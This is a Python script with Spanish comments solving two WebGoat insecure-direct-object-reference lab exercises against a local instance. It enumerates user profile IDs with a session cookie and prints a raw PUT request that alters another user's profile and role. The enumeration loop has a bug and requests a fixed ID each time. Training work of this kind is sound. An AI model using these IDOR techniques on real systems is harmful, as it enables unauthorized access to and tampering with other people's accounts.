
print("-----------PRIMER EJERCICIO de la ultima seccion de insecure direct object reference------------")

"""
detail_user={
  "role" : 3,
  "color" : "yellow",
  "size" : "small",
  "name" : "Tom Cat",
  "userId" : "2342384"
}

url='WebGoat%2FIDOR%2Fprofile%2F2342384' # los %2F son las /
# POST /WebGoat/IDOR/profile/?role=1&color=red&name=Buffalo Bills

# http://127.0.0.1:8080/WebGoat/IDOR/profile/2342384

# role=1&color=red&name=Buffalo%20Bills


GET /WebGoat/IDOR/profile/2342384/ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://127.0.0.1:8080/WebGoat/start.mvc
Cookie: JSESSIONID=tdqddr4yCNFGBOiz_W6h7YLzllMXfQitXAUbc3Ya; csrftoken=YCSR6jAkK3Mwc2QgLskGMQlx6rPeK0KT; sessionid=nrjsi8zwku8q2003ums659kgecvcsicm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-GPC: 1
Content-Length: 55

role=1&color=red&name=Buffalo%20Bills&userId=2342384
"""
import requests

JSESSIONID='DmLagczOPpzpPIl-MFD3FtGLdMc-VREf2L93hO7h'
headers={'Cookie': f'JSESSIONID={JSESSIONID};'}

index = 2342380 # es el userId, el que aparece en la peticion termina en 84 pero yo lo puse aca en 80 para probar si hay otro usuario

for userId in range(index, 2342400 ):
    # print(userId)
    request = requests.get(f'http://127.0.0.1:8080/WebGoat/IDOR/profile/{index}', headers=headers)
    print(request.headers)

    if request.status_code != 500:
        print(f"Index: {userId}")

print("==================================================================================================================================================================")
print("-----------SEGUNDO EJERCICIO de la ultima seccion de insecure direct object reference------------")

"""Lo que debemos hacer es tomar la request que usamos para referenciar al
    objeto tom cat en las secciones anteriores, cambiar el metodo POST a un metodo PUT
    luego hacer uso del ID que encontramos del usuario Buffall y luego pasarle
    un diccionario con los datos que se piden modificar en el ejercicio.
"""
print("""
PUT /WebGoat/IDOR/profile/2342388 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 86
Origin: http://127.0.0.1:8080
Connection: close
Referer: http://127.0.0.1:8080/WebGoat/start.mvc
Cookie: JSESSIONID=lFn8us_fYwRQxcl8SUnteIuD6lbUimFHHFYTv4v0; csrftoken=YCSR6jAkK3Mwc2QgLskGMQlx6rPeK0KT; sessionid=nrjsi8zwku8q2003ums659kgecvcsicm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-GPC: 1

{"role":"1", "color":"red", "size":"large", "name":"Buffalo Bill", "userId":"2342388"}
""")
